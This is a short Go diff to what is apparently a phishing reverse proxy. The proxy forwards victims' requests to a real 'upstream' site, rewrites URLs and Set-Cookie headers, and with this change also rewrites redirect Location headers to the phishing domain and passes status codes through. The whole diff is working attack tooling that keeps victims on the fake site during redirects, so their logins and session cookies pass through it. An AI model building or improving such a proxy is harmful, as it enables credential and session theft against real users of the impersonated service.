@@ -55,8 +55,11 @@ func cloneRequest(r *http.Request) *http.Request {
 	return req
 }
 
-func sendReqToUpstream(req *http.Request) ([]byte, http.Header) {
-	client := http.Client{}
+func sendReqToUpstream(req *http.Request) ([]byte, http.Header, int) {
+	checkRedirect := func(r *http.Request, via []*http.Request) error {
+		return http.ErrUseLastResponse
+	}
+	client := http.Client{CheckRedirect: checkRedirect}
 
 	resp, err := client.Do(req)
 	if err != nil {
@@ -69,13 +72,13 @@ func sendReqToUpstream(req *http.Request) ([]byte, http.Header) {
 	}
 	resp.Body.Close()
 
-	return respBody, resp.Header
+	return respBody, resp.Header, resp.StatusCode
 }
 
 func handler(w http.ResponseWriter, r *http.Request) {
 	req := cloneRequest(r)
 
-	body, header := sendReqToUpstream(req)
+	body, header, statusCode := sendReqToUpstream(req)
 	body = replaceURLInResp(body, header)
 
 	for _, v := range header["Set-Cookie"] {
@@ -85,6 +88,14 @@ func handler(w http.ResponseWriter, r *http.Request) {
 		w.Header().Add("Set-Cookie", newValue)
 	}
 
+	// status code is 3XX
+	if statusCode >= 300 && statusCode < 400 {
+		location := header.Get("Location")
+		newLocation := strings.Replace(location, upstreamURL, phishURL, -1)
+		w.Header().Set("Location", newLocation)
+	}
+
+	w.WriteHeader(statusCode)
 	w.Write(body)
 }
 
